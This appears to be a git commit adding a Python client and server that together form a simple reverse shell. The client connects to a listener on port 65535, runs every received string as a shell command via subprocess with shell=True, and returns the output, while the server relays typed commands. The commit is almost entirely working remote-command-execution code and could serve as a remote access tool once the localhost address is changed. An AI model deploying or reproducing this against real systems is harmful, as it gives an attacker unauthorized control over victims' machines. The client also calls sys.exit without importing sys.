6dfbf96c57c94937c9d20a4439ecfbda156b7f0a
Filip Weidemann <filip.weidemann@outlook.de>
2017-04-21 21:53:33 +0200

    Server & Client script added

--- client.py
+++ client.py
@@ -1,1 +1,32 @@
+import os
+import socket
+import subprocess
+
+sock = socket.socket()
+host = 'localhost'
+port = 65535
+sock.connect((host, port))
+
+while True:
+    data = sock.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+
+    if len(data) > 0:
+        if data[:].decode("utf-8") == 'exit':
+            break
+
+        command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output_in_bytes = command.stdout.read() + command.stderr.read()
+        output_in_str = str(output_in_bytes, "utf-8")
+        sock.send(str.encode(output_in_str + str(os.getcwd()) + "> "))
+        print(output_in_str)
+
+
+# Close Connection
+sock.close()
+sys.exit()
+
+
 
--- server.py
+++ server.py
@@ -1,1 +1,59 @@
+import socket
+import sys
+
+# Create socket
+def create_socket():
+    try:
+        global host
+        global port
+        global sock
+        host = ''
+        port = 65535
+        sock = socket.socket()
+    except socket.error as msg:
+        print("Error occured while creating socket: " + str(msg))
+
+
+# Bind socket to port and listen for clients
+def bind_socket():
+    try:
+        global host
+        global port
+        global sock
+        print("Bind to port: " + str(port))
+        sock.bind((host, port))
+        sock.listen(5)
+    except socket.error as msg:
+        print("Error occured while binding socket and port: " + str(msg) + ", retrying..")
+        bind_socket()
+
+
+# Establish connections
+def accept_socket():
+    connection, address = sock.accept()
+    print("Connection established | " + "IP: " + address[0] + " | Port: " + str(address[1]))
+    send_instructions(connection)
+    connection.close()
+
+
+def send_instructions(connection):
+    while True:
+        command = input()
+        if command == 'exit':
+            connection.close()
+            sock.close()
+            sys.exit('Session suspended!')
+
+        if len(str.encode(command)) > 0:
+            connection.send(str.encode(command))
+            client_response = str(connection.recv(1024), "utf-8")
+            print(client_response)
+
+def main():
+    create_socket()
+    bind_socket()
+    accept_socket()
+
+main()
+
 
